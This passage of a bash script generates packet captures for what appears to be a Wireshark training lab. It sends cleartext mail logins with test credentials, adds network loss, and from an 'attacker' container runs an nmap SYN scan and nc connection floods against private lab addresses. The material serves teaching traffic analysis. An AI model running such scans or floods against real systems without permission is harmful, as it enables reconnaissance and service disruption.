    (
    sleep 0.3
    echo "EHLO shark-tank-client"
    sleep 0.3
    echo "AUTH LOGIN"
    sleep 0.3
    echo -n "${IMAP_USER}" | base64
    sleep 0.3
    echo -n "${IMAP_PASS}" | base64
    sleep 0.3
    echo "MAIL FROM:<${IMAP_USER}@shark-tank.local>"
    sleep 0.3
    echo "RCPT TO:<destek@shark-tank.local>"
    sleep 0.3
    echo "DATA"
    sleep 0.3
    echo "From: ${IMAP_USER}@shark-tank.local"
    echo "To: destek@shark-tank.local"
    echo "Subject: Auth Test"
    echo ""
    echo "Bu email AUTH LOGIN ile gonderildi."
    echo "."
    sleep 0.3
    echo "QUIT"
    ) | nc -w 5 172.50.2.18 587' 2>/dev/null || true
    sleep 1

    echo "  3/4 POP3 oturumu..."
    docker exec shark-tank-client bash -c '
    (
    sleep 0.3
    echo "USER kullanici"
    sleep 0.3
    echo "PASS secret123"
    sleep 0.3
    echo "STAT"
    sleep 0.3
    echo "LIST"
    sleep 0.3
    echo "RETR 1"
    sleep 0.3
    echo "QUIT"
    ) | nc -w 5 172.50.2.18 110' 2>/dev/null || true
    sleep 1

    echo "  4/4 IMAP oturumu..."
    docker exec shark-tank-client bash -c '
    (
    sleep 0.3
    echo "a1 LOGIN kullanici secret123"
    sleep 0.3
    echo "a2 SELECT INBOX"
    sleep 0.3
    echo "a3 FETCH 1 (BODY[])"
    sleep 0.3
    echo "a4 LOGOUT"
    ) | nc -w 5 172.50.2.18 143' 2>/dev/null || true
    sleep 1

    stop_capture
    echo "  Pcap: shared/pcaps/module-15-email.pcap"
}

generate_advanced_tcp() {
    echo ""
    echo "=== İleri Düzey TCP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Ağ gecikmesi/kaybı etkinleştiriliyor (retransmission/SACK/dup ACK için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 200ms loss 25% 2>/dev/null || true

    start_capture "module-11-advanced-tcp"

    echo "  Büyük veri transferi (retransmission + SACK + zero window tetikleme)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"D\"*80000)" 2>/dev/null | nc -w 5 172.50.2.12 8080' 2>/dev/null || true
    sleep 1

    echo "  Zero window tetikleme (yavaş okuyucu)..."
    docker exec shark-tank-client bash -c 'python3 -c "
import socket, time
s = socket.socket()
s.connect((\"172.50.2.12\", 8080))
s.send(b\"X\"*100000)
time.sleep(1)
s.close()
" 2>/dev/null' 2>/dev/null || true
    sleep 1

    echo "  TCP keep-alive paketleri (SO_KEEPALIVE)..."
    docker exec shark-tank-client bash -c 'python3 -c "
import socket, time
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 1)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
s.connect((\"172.50.2.12\", 8080))
s.send(b\"ka-test\")
time.sleep(5)
s.close()
" 2>/dev/null' 2>/dev/null || true
    sleep 1

    echo "  Çoklu kısa bağlantılar (window scaling gözlemi)..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3; do echo "quick-$i" | nc -w 1 172.50.2.12 8080; done'
    sleep 1

    echo "  Attacker: agresif bağlantılar..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 10); do echo "flood-$i" | nc -w 0.1 172.50.2.12 8080 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 2

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    merge_attacker_pcap "module-11-advanced-tcp"
    echo "  Pcap: shared/pcaps/module-11-advanced-tcp.pcap"
}

generate_tcp_sequence() {
    echo ""
    echo "=== TCP Dizi Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Ağ gecikmesi/kaybı etkinleştiriliyor (retransmission/dup ACK için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 200ms loss 25% 2>/dev/null || true

    start_capture "module-09-tcp-sequence"

    echo "  TCP echo veri gönderimi (retransmission için uygun)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"X\"*8000)" 2>/dev/null | nc -w 3 172.50.2.12 8080' 2>/dev/null || true
    sleep 0.5

    echo "  Flood pattern (dup ACK/out-of-order tetikleme)..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 15); do echo "flood-$i" | nc -w 0.1 172.50.2.12 8080 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    echo "  Büyük HTTP (TCP grafik için)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Port scan + TCP veri (karışık dizi)..."
    docker exec shark-tank-attacker nmap -sS -p 1-1000 172.50.2.12 > /dev/null 2>&1 || true
    sleep 1

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    merge_attacker_pcap "module-09-tcp-sequence"
    echo "  Pcap: shared/pcaps/module-09-tcp-sequence.pcap"
}

generate_tcp_graph() {
    echo ""
    echo "=== TCP Grafik Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Hafif ağ gecikmesi/kaybı (grafik analizi için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 150ms loss 20% 2>/dev/null || true

    start_capture "module-19-tcp-graph"

    echo "  Büyük veri transferi (IO Graph için)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"G\"*30000)" 2>/dev/null | nc -w 5 172.50.2.12 8080' 2>/dev/null || true
    sleep 1

    echo "  HTTP büyük response..."
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Arka arkaya çoklu istek (throughput grafiği)..."
    for i in $(seq 1 5); do
        docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null 2>&1 || true
        sleep 0.2
    done

    echo "  TCP echo çoklu bağlantı..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3; do echo "test-$i" | nc -w 1 172.50.2.12 8080; done'
    sleep 0.5

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    echo "  Pcap: shared/pcaps/module-19-tcp-graph.pcap"
}

generate_performance() {
    echo ""
    echo "=== Performans Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Ağ gecikmesi/kaybı etkinleştiriliyor (yüksek RTT/retransmission için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 300ms loss 25% 2>/dev/null || true

    start_capture "module-20-performance"

    echo "  Normal trafik (baseline)..."
    docker exec shark-tank-client bash -c 'echo "normal" | nc -w 2 172.50.2.12 8080' 2>/dev/null || true
    sleep 0.5

    echo "  Büyük veri (window scaling + retransmission + dup ACK)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"P\"*80000)" 2>/dev/null | nc -w 5 172.50.2.12 8080' 2>/dev/null || true
    sleep 1

    echo "  Zero window tetikleme (yavaş okuyucu)..."
    docker exec shark-tank-client bash -c 'python3 -c "
import socket, time
s = socket.socket()
s.connect((\"172.50.2.12\", 8080))
s.send(b\"X\"*100000)
time.sleep(1)
s.close()
" 2>/dev/null' 2>/dev/null || true
    sleep 1

    echo "  HTTP yavaş response simülasyonu..."
    docker exec shark-tank-client curl -s --connect-timeout 5 http://172.50.2.10/large > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Çoklu hızlı bağlantı (port exhaustion sim)..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 25); do echo "burst-$i" | nc -w 0.5 172.50.2.12 8080 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 2

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    merge_attacker_pcap "module-20-performance"
    echo "  Pcap: shared/pcaps/module-20-performance.pcap"
}

generate_baseline() {
    echo ""
    echo "=== Baseline Trafiği Üretiliyor ==="
    start_capture "module-23-baseline"

    echo "  Normal HTTP..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null
    sleep 0.5

    echo "  Normal DNS..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local +short > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 google.com +short > /dev/null
    sleep 0.5

    echo "  Normal ICMP..."
    docker exec shark-tank-client ping -c 3 172.50.2.14 > /dev/null
    sleep 0.5

    echo "  Normal TCP echo..."
    docker exec shark-tank-client bash -c 'echo "baseline" | nc -w 2 172.50.2.12 8080'
    sleep 0.5

    echo "  Normal HTTPS..."
    docker exec shark-tank-client curl -sk https://172.50.2.13/ > /dev/null
    sleep 0.5

    echo "  Anomali: port scan + SYN flood..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,80,443 172.50.2.10 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 15); do echo "flood" | nc -w 0.1 172.50.2.10 80 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    stop_capture
    merge_attacker_pcap "module-23-baseline"
    echo "  Pcap: shared/pcaps/module-23-baseline.pcap"
    echo "  Not: module-24-exam-practice.pcap ile karşılaştırmalı analiz için kullanılır."
}

case "$MODULE" in
    all)
        generate_basics    || echo "  [UYARI] basics başarısız, devam ediliyor"
        generate_arp       || echo "  [UYARI] arp başarısız, devam ediliyor"
        generate_dhcp      || echo "  [UYARI] dhcp başarısız, devam ediliyor"
        generate_icmp      || echo "  [UYARI] icmp başarısız, devam ediliyor"
        generate_fragmentation  || echo "  [UYARI] fragmentation başarısız, devam ediliyor"
        generate_ipv6      || echo "  [UYARI] ipv6 başarısız, devam ediliyor"
        generate_tcp       || echo "  [UYARI] tcp başarısız, devam ediliyor"
        generate_tcp_sequence || echo "  [UYARI] tcp-sequence başarısız, devam ediliyor"
        generate_udp       || echo "  [UYARI] udp başarısız, devam ediliyor"
        generate_advanced_tcp || echo "  [UYARI] advanced-tcp başarısız, devam ediliyor"
        generate_dns       || echo "  [UYARI] dns başarısız, devam ediliyor"
        generate_http      || echo "  [UYARI] http başarısız, devam ediliyor"
        generate_ftp       || echo "  [UYARI] ftp başarısız, devam ediliyor"
        generate_email     || echo "  [UYARI] email başarısız, devam ediliyor"
        generate_tls       || echo "  [UYARI] tls başarısız, devam ediliyor"
        generate_tcp_graph  || echo "  [UYARI] tcp-graph başarısız, devam ediliyor"
        generate_performance || echo "  [UYARI] performance başarısız, devam ediliyor"
        generate_voip       || echo "  [UYARI] voip başarısız, devam ediliyor"
        generate_baseline   || echo "  [UYARI] baseline başarısız, devam ediliyor"
        generate_mixed     || echo "  [UYARI] mixed başarısız, devam ediliyor"
        generate_forensics || echo "  [UYARI] forensics başarısız, devam ediliyor"
        ;;
    basics)          generate_basics ;;
    arp)             generate_arp ;;
    http)            generate_http ;;
    dns)             generate_dns ;;
    tcp)             generate_tcp ;;
    tcp-sequence)    generate_tcp_sequence ;;
    tls)             generate_tls ;;
    icmp)            generate_icmp ;;
    ftp)             generate_ftp ;;
    dhcp)            generate_dhcp ;;
    mixed)           generate_mixed ;;
    forensics)       generate_forensics ;;
    voip)            generate_voip ;;
    udp)             generate_udp ;;
    ipv6)            generate_ipv6 ;;
    fragmentation)   generate_fragmentation ;;
    email)           generate_email ;;
    advanced-tcp)    generate_advanced_tcp ;;
    tcp-graph)       generate_tcp_graph ;;
    performance)     generate_performance ;;
    baseline)        generate_baseline ;;
    filters)         echo "  [BİLGİ] Filters modülü (02) - trafik üretilmez, sadece filter örnekleri gösterilir" ;;
    tshark)          echo "  [BİLGİ] TShark modülü (17) - trafik üretilmez, CLI analiz araçları öğretilir" ;;
    advanced-capture) echo "  [BİLGİ] Advanced Capture modülü (18) - trafik üretilmez, capture teknikleri öğretilir" ;;
    wlan)            echo "  [BİLGİ] WLAN modülü (21) - trafik üretilmez, örnek pcap indirilir (sample-pcaps)" ;;
    sample-pcaps)    echo "  sample-pcaps indirme: ./scripts/download-sample-pcaps.sh" ;;
    *)
        echo "Shark-Tank Trafik Üretici"
        echo ""
        echo "Kullanım: $0 <modül>"
        echo ""
        echo "Modüller:"
        echo "  basics         - (Modül 01) Temel trafik (HTTP, DNS, ICMP, TCP echo)"
        echo "  arp            - (Modül 03) ARP trafiği (ARP request/reply, gratuitous ARP, spoofing)"
        echo "  dhcp           - (Modül 04) DHCP DORA süreci (ayrı docker-compose)"
        echo "  icmp           - (Modül 05) Ping, farklı boyutlar, timeout, TTL"
        echo "  fragmentation  - (Modül 06) IP fragmentation (büyük ping, UDP fragmentation)"
        echo "  ipv6           - (Modül 07) IPv6 link-local, neighbor discovery, AAAA DNS"
        echo "  tcp            - (Modül 08) TCP echo, handshake, port scan, RST"
        echo "  tcp-sequence   - (Modül 09) TCP dizi analizi (retransmission, dup ACK)"
        echo "  udp            - (Modül 10) UDP echo, DNS over UDP, port unreachable"
        echo "  advanced-tcp   - (Modül 11) İleri düzey TCP (keep-alive, window scaling)"
        echo "  dns            - (Modül 12) DNS sorguları (A, AAAA, CNAME, MX, NS, NXDOMAIN)"
        echo "  http           - (Modül 13) HTTP istek/response (GET, POST, 403, 404, redirect)"
        echo "  ftp            - (Modül 14) FTP login, dosya transferi, cleartext credentials"
        echo "  email          - (Modül 15) SMTP email gönderme (cleartext)"
        echo "  tls            - (Modül 16) TLS handshake, HTTPS istekleri, sertifika"
        echo "  mixed          - (Modül 24) Karışık trafik + saldırı simülasyonu (sınav pratiği)"
        echo "  forensics      - (Modül 25) Forensics senaryolar (port scan, SYN flood)"
        echo "  tcp-graph      - (Modül 19) IO Graph, TCP Stream Graphs"
        echo "  performance    - (Modül 20) Performans analizi (RTT, window, throughput)"
        echo "  voip           - (Modül 22) VoIP/SIP trafiği (REGISTER, INVITE, BYE)"
        echo "  baseline       - (Modül 23) Baseline trafik desenleri"
        echo "  filters        - (Modül 02) Filter örnekleri (trafik yok)"
        echo "  tshark         - (Modül 17) TShark CLI analizi (trafik yok)"
        echo "  advanced-capture - (Modül 18) Gelişmiş yakalama teknikleri (trafik yok)"
        echo "  wlan           - (Modül 21) WiFi/WLAN analizi (trafik yok, sample-pcaps)"
        echo "  sample-pcaps   - Wireshark sample captures indir"
        echo "  all            - Tüm modülleri çalıştır"
        echo ""
        echo "Örnek: $0 http"
        ;;
esac
